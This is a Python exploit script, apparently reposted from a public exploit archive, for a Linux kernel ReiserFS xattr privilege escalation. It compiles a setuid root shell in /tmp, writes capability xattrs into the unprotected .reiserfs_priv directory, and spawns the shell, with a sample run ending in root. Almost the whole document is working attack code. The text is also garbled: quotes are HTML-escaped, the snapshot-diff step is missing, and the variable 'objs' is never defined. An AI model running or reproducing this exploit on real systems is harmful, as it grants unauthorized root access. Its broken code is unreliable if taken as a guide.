Linux Kernel <= 2.6.34-rc3 ReiserFS xattr Privilege Escalation
==============================================================

#!/usr/bin/env python
 
&#039;&#039;&#039;
  team-edward.py
  
  Linux Kernel <= 2.6.34-rc3 ReiserFS xattr Privilege Escalation
  Jon Oberheide <jon@oberheide.org>
  http://jon.oberheide.org
   
  Information:
  
    https://bugzilla.redhat.com/show_bug.cgi?id=568041
 
    The kernel allows processes to access the internal ".reiserfs_priv"
    directory at the top of a reiserfs filesystem which is used to store
    xattrs. Permissions are not enforced in that tree, so unprivileged
    users can view and potentially modify the xattrs on arbitrary files.
 
  Usage:
  
    $ python team-edward.py
    [+] checking for reiserfs mount with user_xattr mount option
    [+] checking for private xattrs directory at /.reiserfs_priv/xattrs
    [+] compiling shell in /tmp
    [+] setting dummy xattr to get reiserfs object id
    [+] capturing post-shell snapshot of private xattrs directory
    [+] found 1 new object ids
    [+] setting cap_setuid/cap_setgid capabilities on object id 192B.1468
    [+] spawning setuid shell...
    # id
    uid=0(root) gid=0(root) groups=4(adm), ...
  
  Notes:
  
    Obviously requires a ReiserFS filesystem mounted with extended attributes.
    Tested on Ubuntu Jaunty 9.10.
&#039;&#039;&#039;
 
import os, sys
 
SHELL = &#039;int main(void) { setgid(0); setuid(0); execl("/bin/sh", "sh", 0); }&#039;
XATTR = &#039;\x41\x58\x46\x52\xc1\x00\x00\x02\x01\x00\x00\x02\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#039;
 
def err(txt):
    print &#039;[-] error: %s&#039; % txt
    sys.exit(1)
 
def msg(txt):
    print &#039;[+] %s&#039; % txt
 
def main():
    msg(&#039;checking for reiserfs mount with user_xattr mount option&#039;)
 
    f = open(&#039;/etc/fstab&#039;)
    for line in f:
        if &#039;reiserfs&#039; in line and &#039;user_xattr&#039; in line:
            break
    else:
        err(&#039;failed to find a reiserfs mount with user_xattr&#039;)
    f.close()
 
    msg(&#039;checking for private xattrs directory at /.reiserfs_priv/xattrs&#039;)
 
    if not os.path.exists(&#039;/.reiserfs_priv/xattrs&#039;):
        err(&#039;failed to locate private xattrs directory&#039;)
 
 
    f = open(&#039;/tmp/team-edward.c&#039;, &#039;w&#039;)
    f.write(SHELL)
    f.close()
 
 
     
    msg(&#039;compiling shell in /tmp&#039;)
 
    ret = os.system(&#039;gcc -w /tmp/team-edward.c -o /tmp/team-edward&#039;)
    if ret != 0:
        err(&#039;error compiling shell, you need gcc&#039;)
 
    msg(&#039;setting dummy xattr to get reiserfs object id&#039;)
 
    os.system(&#039;setfattr -n "user.hax" -v "hax" /tmp/team-edward&#039;)
    if ret != 0:
        err(&#039;error setting xattr, you need setfattr&#039;)
 
    msg(&#039;capturing post-shell snapshot of private xattrs directory&#039;)
 
    post = set(os.listdir(&#039;/.reiserfs_priv/xattrs&#039;))
 
 
    msg(&#039;found %s new object ids&#039; % len(objs))
 
    for obj in objs:
        msg(&#039;setting cap_setuid/cap_setgid capabilities on object id %s&#039; % obj)
    
        f = open(&#039;/.reiserfs_priv/xattrs/%s/security.capability&#039; % obj, &#039;w&#039;)
        f.write(XATTR)
        f.close()
 
    msg(&#039;spawning setuid shell...&#039;)
 
    os.system(&#039;/tmp/team-edward&#039;)
 
if __name__ == &#039;__main__&#039;:
    main()



